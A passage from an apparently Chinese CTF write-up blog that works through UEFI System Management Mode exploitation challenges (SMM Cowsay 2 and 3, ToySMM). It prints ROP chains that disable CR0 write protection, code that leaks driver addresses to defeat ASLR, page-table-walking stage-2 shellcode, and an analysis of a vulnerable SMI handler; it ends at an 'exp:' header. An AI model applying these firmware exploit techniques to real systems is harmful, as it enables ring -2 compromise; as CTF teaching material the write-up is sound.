链是这样的：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ret_0x70 = <span class="number">0x7F83000</span> + <span class="number">0x8a49</span> <span class="comment"># VariableSmm.efi + 0x8a49: ret 0x70</span></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span>.encode(<span class="string">&#x27;utf-16-le&#x27;</span>) * <span class="number">200</span> + p64(ret_0x70)</span><br><span class="line"></span><br><span class="line">real_chain = [</span><br><span class="line">    <span class="comment"># Unset CR0.WP</span></span><br><span class="line">    <span class="number">0x7f8a184</span> , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x80000033</span>, <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fcf70d</span> , <span class="comment"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set PTE of flag page as present</span></span><br><span class="line">    <span class="comment"># PTE at 0x7ed0200, original value = 0x8000000044440066</span></span><br><span class="line">    <span class="number">0x7f8a184</span>         , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x7ed0200</span>         , <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fc123d</span>         , <span class="comment"># pop rdx ; ret</span></span><br><span class="line">    <span class="number">0x8000000044440067</span>, <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7fc9385</span>         , <span class="comment"># mov dword ptr [rax], edx ; xor eax, eax ;</span></span><br><span class="line">                        <span class="comment"># pop rbx ; pop rbp ; pop r12 ; ret</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read flag into RAX and then let everything chain</span></span><br><span class="line">    <span class="comment"># crash to simply leak it from the register dump</span></span><br><span class="line">    <span class="number">0x7ee8222</span> , <span class="comment"># pop rsi ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RSI</span></span><br><span class="line">    <span class="number">0x7fc123d</span> , <span class="comment"># pop rdx ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7ee82fe</span> , <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    <span class="number">0x44440000</span>, <span class="comment"># -&gt; RDI (flag address)</span></span><br><span class="line">    <span class="number">0x7ff7b2c</span> , <span class="comment"># mov rax, qword ptr [rdi] ; sub rsi, rdx ; add rax, rsi ; ret</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>将flag读到rax寄存器中</p><p>然后执行几次即可获得完整的flag</p><h2 id="uictf2022-cowsay3"><a href="#uictf2022-cowsay3" class="headerlink" title="uictf2022-cowsay3"></a>uictf2022-cowsay3</h2><p>题目描述</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">We fired that engineer. Unfortunately, other engineers refused to touch this code, but instead suggested to integrate some ASLR code found online. Additionally, we hardened the system with SMM_CODE_CHK_EN and kept DEP on. Now that we have the monster combination of ASLR+DEP, we should surely be secure, right?</span><br></pre></td></tr></table></figure><p>在之前的基础上又添加了ASLR以及DEP,但好在smmcowsay.efi的代码并没有改变</p><ol><li><p><code>SMM_CODE_CHK_EN</code> 已启用：这是 <code>MSR_SMM_FEATURE_CONTROL</code> MSR中的一个位，它控制SMM是否可以执行其他两个MSR定义的范围之外的代码： <code>IA32_SMRR_PHYSBASE</code> 和 <code>IA32_SMRR_PHYSMASK</code> （基本上在SMRAM之外）。当设置 <code>SMM_CODE_CHK_EN</code> 时， <code>MSR_SMM_FEATURE_CONTROL</code> 的“Lock”位也在 QEMU 中设置，因此无法禁用此检查。</p><p>这并不是真正的问题，因为我们并没有真正在 SMRAM 之外执行任何代码。假设我们找到了正确的小工具，我们已经可以通过一个简单的 ROP 链（利用 SMRAM 中已有的代码）获得我们想要的东西。</p></li><li><p>ASLR 已添加到 EDK2（<a href="https://github.com/jyao1/SecurityEx来自">https://github.com/jyao1/SecurityEx来自</a> jyao1/SecurityEx 的原始补丁，有一些细微的更改）：现在每个驱动程序都加载到不同的地址，该地址会更改每次启动，并使用 <code>rdrand</code> 指令获取 10 位熵。不用说，这使得像我们之前的漏洞利用那样使用硬编码地址变得不可能。</p></li></ol><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>解决ASLR最常见的办法就是泄露一个基址</p><p>我们如何泄露一些SMM地址以击败ASLR？ EDK2 驱动程序注册了一堆协议。每个协议都有自己的 GUID，使用有效的 GUID 调用 <code>BootServices-&gt;LocateProtocol</code> 将返回指向协议结构的指针（如果存在），该结构驻留在实现协议的驱动程序中！这允许我们泄漏实现在执行代码时注册的协议的任何驱动程序的基地址（在简单的减法之后）</p><p>如果我们查看 EDK2 源代码中的文件<a href="https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/MdePkg.dec">MdePkg/MdePkg.dec</a>，我们会看到一堆针对不同协议的 GUID。甚至无需浪费时间检查源代码的其他部分，我们就可以将它们全部转储并尝试请求其中的每一个，直到找到一个看起来有趣的地址。</p><p>再次，修补 <code>run.sh</code> 脚本，让 QEMU 将 EDK2 调试输出转储到文件中，就像我们对 SMM Cowsay 2 所做的那样，我们可以找到 SMBASE，在编写漏洞利用程序时假设它是 SMRAM 的起始地址。理论上，SMRAM可以在SMBASE之前和之后扩展，根据Intel Doc，SMBASE只是标记用于查找SMI处理程序和保存状态区域的入口点的基地址。</p><p><code>CPU[000]  APIC ID=0000  SMBASE=07FAF000  SaveState=07FBEC00  Size=00000400</code></p><p>现在，使用我们在之前的两个挑战中使用的相同代码，我们可以检查 <code>MdePkg/MdePkg.dec</code> 中列出的每个协议 GUID，并查看返回的地址是否在 SMBASE 之后:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;debug.log&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&#x27;CPU[000]  APIC ID=0000  SMBASE=&#x27;</span>):</span><br><span class="line">            smbase = <span class="built_in">int</span>(line[<span class="number">31</span>:<span class="number">31</span> + <span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Manually or programmatically extract GUIDs from MdePkg/MdePkg.dec</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> guid <span class="keyword">in</span> guids:</span><br><span class="line">    code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        /* LocateProtocol(&amp;guid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">        lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">        mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">        call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        test rax, rax</span></span><br><span class="line"><span class="string">        jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rax, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">        ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fail:</span></span><br><span class="line"><span class="string">        ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    guid:</span></span><br><span class="line"><span class="string">        .octa <span class="subst">&#123;guid&#125;</span></span></span><br><span class="line"><span class="string">    protocol:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">    proto = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> proto &gt; smbase:</span><br><span class="line">        log.info(<span class="string">&#x27;Interesting protocol: GUID = 0x%x, ADDR = 0x%x&#x27;</span>, guid, proto)</span><br></pre></td></tr></table></figure><p>果然，通过让脚本运行足够的时间，我们发现 <code>gEfiSmmConfigurationProtocolGuid</code> 返回一个指向协议地址的指针。查看已加载驱动程序的 <code>debug.log</code> ，我们可以看到该地址位于 <code>PiSmmCpuDxeSmm.efi</code> SMM 驱动程序内部，简单的减法即可得出其基地址。</p><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>现在我们可以看一下 <code>PiSmmCpuDxeSmm.efi</code> 中的gadgets。事实证明，我们很幸运：</p><ul><li>从 GDB 来看，我们仍然有 R13、R14 和 R15 以完全相同的偏移量溢出到 SMI 堆栈上。</li><li>我们可以向前移动堆栈指针： <code>ret 0x6d</code></li><li>我们可以翻转堆栈： <code>pop rsp; ret</code></li><li>我们可以弹出 RAX 和其他寄存器： <code>pop rax ; pop rbx ; pop r12 ; ret</code></li><li>我们可以设置CR0： <code>mov cr0, rax ; wbinvd ; ret</code></li><li>我们有一个 write-what-where 原语： <code>mov qword ptr [rbx], rax ; pop rbx ; ret</code></li></ul><p>我们没有更多好的gadgets可以使用，所以这次在禁用 CR0.WP 后，我们不再使用 ROP 编写整个漏洞利用程序，而是使用 write-what-where gadget 来覆盖 <code>PiSmmCpuDxeSmm.efi</code> 的一段 <code>.text</code> 带有第 2 阶段 shellcode，然后简单地跳转到它。<br>唯一有点烦人的部分是 <code>ret 0x6d</code> gadget 将堆栈向前移动：这将导致堆栈未对齐，落在堆栈上溢出的 R13 值的 2 个最高有效字节中。<strong>这不是一个真正的问题，幸运的是 CPU（或者更好的是 QEMU）似乎并不关心未对齐的堆栈指针。</strong>我们只需使用 R{13,14,15} 进行一些位移即可将值很好地放入堆栈中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># SmmConfigurationProtocol leaked using <span class="title function_">LocateProtocol</span><span class="params">(gEfiSmmConfigurationProtocolGuid)</span></span><br><span class="line">PiSmmCpuDxeSmm_base = SmmConfigurationProtocol - <span class="number">0x16210</span></span><br><span class="line">PiSmmCpuDxeSmm_text = PiSmmCpuDxeSmm_base + <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;SmmConfigurationProtocol    @ 0x%x&#x27;</span>, SmmConfigurationProtocol)</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;=&gt; PiSmmCpuDxeSmm.efi       @ 0x%x&#x27;</span>, PiSmmCpuDxeSmm_base)</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&#x27;=&gt; PiSmmCpuDxeSmm.efi .text @ 0x%x&#x27;</span>, PiSmmCpuDxeSmm_text)</span><br><span class="line"></span><br><span class="line">new_smm_stack   = buffer + <span class="number">0x800</span></span><br><span class="line">ret_0x6d        = PiSmmCpuDxeSmm_base + <span class="number">0xfc8a</span>  <span class="meta"># ret 0x6d</span></span><br><span class="line">flip_stack      = PiSmmCpuDxeSmm_base + <span class="number">0x3c1c</span>  <span class="meta"># pop rsp ; ret</span></span><br><span class="line">pop_rax_rbx_r12 = PiSmmCpuDxeSmm_base + <span class="number">0xd228</span>  <span class="meta"># pop rax ; pop rbx ; pop r12 ; ret</span></span><br><span class="line">mov_cr0_rax     = PiSmmCpuDxeSmm_base + <span class="number">0x10a7d</span> <span class="meta"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line">write_primitive = PiSmmCpuDxeSmm_base + <span class="number">0x3b8f</span>  <span class="meta"># mov qword ptr [rbx], rax ; pop rbx ; ret</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span>.encode(<span class="string">&#x27;utf-16-le&#x27;</span>) * <span class="number">200</span> + p64(ret_0x6d)</span><br></pre></td></tr></table></figure><p>正如我们刚才所说，我们将使用一些gadgets来创建 ROP 链，这些gadgets会将第二阶段 shellcode 写入 <code>PiSmmCpuDxeSmm.efi</code> 的 <code>.text</code> 中，然后跳转到它。该 shellcode 必须遍历页表（这次由于 ASLR，我们无法预先计算 PTE 的地址），设置 PTE 上的当前位，然后将标志读入（一个或多个）寄存器。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">stage2_shellcode = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    movabs rbx, 0xffffffff000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Walk page table */</span></span><br><span class="line"><span class="string">    mov rax, cr3</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax]</span></span><br><span class="line"><span class="string">    and rax, rbx</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 8 * 0x1]</span></span><br><span class="line"><span class="string">    and rax, rbx</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 8 * 0x22]</span></span><br><span class="line"><span class="string">    and rax, rbx</span></span><br><span class="line"><span class="string">    mov rbx, rax</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 8 * 0x40]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Set present bit */</span></span><br><span class="line"><span class="string">    or al, 1</span></span><br><span class="line"><span class="string">    mov qword ptr [rbx + 8 * 0x40], rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Read flag and die so regs get dumped, GG! */</span></span><br><span class="line"><span class="string">    movabs rax, 0x44440000</span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax]</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">real_chain = [</span><br><span class="line">    <span class="comment"># Unset CR0.WP</span></span><br><span class="line">    pop_rax_rbx_r12, <span class="comment"># pop rax ; pop rbx ; pop r12 ; ret</span></span><br><span class="line">    <span class="number">0x80000033</span>     , <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>     , <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>     , <span class="comment"># filler</span></span><br><span class="line">    mov_cr0_rax    , <span class="comment"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now that CR0.WP is unset, we can just patch SMM code and jump to it!</span></span><br><span class="line"><span class="comment"># Make the ROP chain write the stage 2 shellcode at PiSmmCpuDxeSmm_text</span></span><br><span class="line"><span class="comment"># 8 bytes at a time, then jump into it</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(stage2_shellcode), <span class="number">8</span>):</span><br><span class="line">    chunk = stage2_shellcode[i:i + <span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">    chunk = u64(chunk)</span><br><span class="line"></span><br><span class="line">    real_chain += [</span><br><span class="line">        pop_rax_rbx_r12        , <span class="comment"># pop rax ; pop rbx ; pop r12 ; ret</span></span><br><span class="line">        chunk                  , <span class="comment"># -&gt; RAX</span></span><br><span class="line">        PiSmmCpuDxeSmm_text + i, <span class="comment"># -&gt; RBX</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>             ,</span><br><span class="line">        write_primitive        , <span class="comment"># mov qword ptr [rbx], rax ; pop rbx ; ret</span></span><br><span class="line">        <span class="number">0xdeadbeef</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">real_chain += [PiSmmCpuDxeSmm_text]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Transform real ROP chain into .quad directives to embed in the shellcode:</span></span><br><span class="line"><span class="comment">#   .quad 0x7f8a184</span></span><br><span class="line"><span class="comment">#   .quad 0x80000033</span></span><br><span class="line"><span class="comment">#    ...</span></span><br><span class="line">real_chain_size = <span class="built_in">len</span>(real_chain) * <span class="number">8</span></span><br><span class="line">real_chain      = <span class="string">&#x27;.quad &#x27;</span> + <span class="string">&#x27;\n.quad &#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, real_chain))</span><br></pre></td></tr></table></figure><p><strong>SMM的代码段是可写的,应该不是本题专属</strong></p><h2 id="Doubhe2024-ToySMM"><a href="#Doubhe2024-ToySMM" class="headerlink" title="Doubhe2024-ToySMM"></a>Doubhe2024-ToySMM</h2><p><em>有了前面三题的基础,这不是乱杀</em></p><p>先跑一下<code>run.sh</code>,看看程序是怎样运行的</p><p>启动后弹出了这么一个窗口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">UEFI Interactive Shell v2.2</span><br><span class="line">EDK II</span><br><span class="line">UEFI v2.70 (EDK II, 0x00010000)</span><br><span class="line">Mapping table</span><br><span class="line">      FS0: Alias(s):HD0a65535a1:;BLK1:</span><br><span class="line">          PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x0,0xFFFF,0x0)/HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1)</span><br><span class="line">     BLK0: Alias(s):</span><br><span class="line">          PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x0,0xFFFF,0x0)</span><br><span class="line">     BLK2: Alias(s):</span><br><span class="line">          PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x2,0xFFFF,0x0)</span><br><span class="line">Shell&gt; fs0:</span><br><span class="line">FS0:\&gt; mem</span><br><span class="line">Memory Address 00000000069EE018 78 Bytes</span><br><span class="line">  069EE018: 49 42 49 20 53 59 53 54-46 00 02 00 78 00 00 00  *IBI SYSTF...x...*</span><br><span class="line">  069EE028: F8 83 E2 1D 00 00 00 00-18 D1 9B 06 00 00 00 00  *................*</span><br><span class="line">  069EE038: 00 00 01 00 00 00 00 00-98 DF F6 05 00 00 00 00  *................*</span><br><span class="line">  069EE048: F0 22 F6 05 00 00 00 00-18 68 20 06 00 00 00 00  *.<span class="string">&quot;.......h .....*</span></span><br><span class="line"><span class="string">  069EE058: 20 D1 79 05 00 00 00 00-18 C9 F6 05 00 00 00 00  * .y.............*</span></span><br><span class="line"><span class="string">  069EE068: 90 21 F6 05 00 00 00 00-98 EB 9E 06 00 00 00 00  *.!..............*</span></span><br><span class="line"><span class="string">  069EE078: 80 6B FD 06 00 00 00 00-0A 00 00 00 00 00 00 00  *.k..............*</span></span><br><span class="line"><span class="string">  069EE088: 98 EC 9E 06 00 00 00 00-                         *........*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Valid EFI Header at Address 00000000069EE018</span></span><br><span class="line"><span class="string">---------------------------------------------</span></span><br><span class="line"><span class="string">System: Table Structure size 00000078 revision 00020046</span></span><br><span class="line"><span class="string">ConIn (0000000005F622F0) ConOut (000000000579D120) StdErr (0000000005F62190)</span></span><br><span class="line"><span class="string">Runtime Services 00000000069EEB98</span></span><br><span class="line"><span class="string">Boot Services    0000000006FD6B80</span></span><br><span class="line"><span class="string">SAL System Table 0000000000000000</span></span><br><span class="line"><span class="string">ACPI Table       0000000006B7E000</span></span><br><span class="line"><span class="string">ACPI 2.0 Table   0000000006B7E014</span></span><br><span class="line"><span class="string">MPS Table        0000000000000000</span></span><br><span class="line"><span class="string">SMBIOS Table     00000000069D7000</span></span><br><span class="line"><span class="string">FS0:\&gt; ToyApp</span></span><br><span class="line"><span class="string">$$$$$$$$$$$$$$$$$$$$$$$$$</span></span><br><span class="line"><span class="string">$$                     $$</span></span><br><span class="line"><span class="string">$$  UEFI BackDoor :)   $$</span></span><br><span class="line"><span class="string">$$  Ring 0 priviledge  $$</span></span><br><span class="line"><span class="string">$$                     $$</span></span><br><span class="line"><span class="string">$$$$$$$$$$$$$$$$$$$$$$$$$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Type some shellcode with &#x27;DONE&#x27; on a seperate line and press enter to execute.</span></span><br><span class="line"><span class="string">Type &#x27;QUIT&#x27; to quit the program.</span></span><br><span class="line"><span class="string">Your shellcode:</span></span><br></pre></td></tr></table></figure><p>熟悉的uefishell任意执行shellcode</p><h3 id="TOYSMM"><a href="#TOYSMM" class="headerlink" title="TOYSMM"></a>TOYSMM</h3><p>使用uefitools处理OVMF_CODE.fd</p><p>工具打开固件包后,搜索题目的名字关键字<code>Toy</code></p><p>将找到的SMM驱动模块dump下来并ida打开</p><p>直奔<code>ChildSwSmiHandler</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS __fastcall <span class="title function_">ChildSwSmiHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">        EFI_HANDLE DispatchHandle,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">void</span> *Context,</span></span><br><span class="line"><span class="params">        _BYTE *CommBuffer,</span></span><br><span class="line"><span class="params">        UINTN *CommBufferSize)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+0h] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">32</span>]; <span class="comment">// [rsp+4h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !CommBuffer || !CommBufferSize )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x8000000000000002</span>ui64;</span><br><span class="line">  v5 = <span class="number">0x41414141</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_2340(CommBuffer + <span class="number">16</span>, &amp;v5, <span class="number">3</span>i64) )</span><br><span class="line">    gBS-&gt;LocateProtocol(&amp;EFI_ACPI_TABLE_PROTOCOL_GUID, <span class="number">0</span>i64, (<span class="type">void</span> **)v6);</span><br><span class="line">  <span class="keyword">if</span> ( &amp;v5 != (<span class="type">int</span> *)<span class="number">0x23330000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_2340((_BYTE *)<span class="number">0x23330000</span>, &amp;v5, <span class="number">3</span>i64) )</span><br><span class="line">      sub_1000();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sub_2340</code>函数用于匹配内存是否相等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_2340</span><span class="params">(_BYTE *a1, _BYTE *a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = *a1++ == *a2++;</span><br><span class="line">    --a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 );</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)*(a1 - <span class="number">1</span>) - (<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)*(a2 - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sub_1000()</code>就直接getflag了</p><p>但是无论如何第二个条件是一定不会满足的</p><p>即</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !sub_2340((_BYTE *)<span class="number">0x23330000</span>, &amp;v5, 3i64) )</span><br><span class="line">      sub_1000();</span><br></pre></td></tr></table></figure><p>是永远不可能满足的</p><p>不过我们可以看到无论如何都是会执行</p><p><code>gBS-&gt;LocateProtocol(&amp;EFI_ACPI_TABLE_PROTOCOL_GUID, 0i64, (void **)v6);</code>的</p><p><strong>而且在DXE态下,我们是具有修改bootservice的权限的</strong>,那岂不是可以直接修改LocateProtocol函数指针为<code>sub_1000()</code>,然后发送SMI即可在<strong>SMM状态</strong>下任意地址执行</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 